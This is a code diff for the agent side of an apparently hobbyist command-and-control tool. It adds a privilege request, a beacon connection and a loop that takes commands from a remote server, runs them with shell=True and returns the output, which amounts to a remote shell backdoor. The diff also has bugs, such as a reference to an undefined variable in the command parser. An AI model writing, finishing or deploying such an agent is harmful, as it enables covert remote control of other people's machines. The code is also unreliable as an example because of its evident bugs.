@@ -14,6 +14,7 @@ import secrets
 import string
 import re
 import json
+import ctypes
 
 os_info = {
         "OS Name": os.name,
@@ -39,6 +40,9 @@ nonce = 0
 
 def start_conn():
     global agent_name
+    global key
+    global nonce
+
     # Get server address and port from user input
     name = input("Enter agent's name(a_z, A_Z, 0_9, _): ")
     if (re.search(agent_name_pattern,name)):
@@ -74,9 +78,10 @@ def start_conn():
         print("*Successfully connected to server {}:{}".format(server_address,server_port))
         beacon_thread = threading.Thread(target=handle_beacon, args=(int.from_bytes(data,byteorder='big'), b_sock))
         beacon_thread.start()
+
     except Exception as e:
         print(f"An error occurred: {e}")
-
+    
 def handle_beacon(init_n:int,sock:socket):
     while True:
         try:
@@ -144,17 +149,36 @@ def sec_recv(sock: socket, key, nonce) -> bytes:
     return mess
 
 def excute_cmd(cmd_args: list):
+   try:
     match cmd_args[0]:
+        case "exec":
+            return exec_cmd(cmd_args)
         case "agents":
             print()
         case _:
-            print("*Unknown command. Please type \"help\" for help.")
+            print("*Command error!")
+   except:
+       print("*Command error!")
+   return 0
 
+def exec_cmd(cmd_args: list):
+    cmd = cmd_args[1]
+    if cmd[0] == "\"":
+        cmd = cmd[1:]
+        i = 2
+        cmd += cmd_args[i]
+        while cmd_args[i][-1] != "\"":
+            i+=1
+            agent_cmd += cmd_args[i]
+        cmd = cmd[:-1]
+    return subprocess.check_output(cmd, shell=True, text=True)
+    
 # start main
 if __name__ == "__main__":
     ask_privileges()
     start_conn()
-
+    while True:
+        sec_sendall(excute_cmd(sec_recv(sock,key,nonce).decode().split()).encode(),sock,key,nonce)
 
 '''
 cmd response
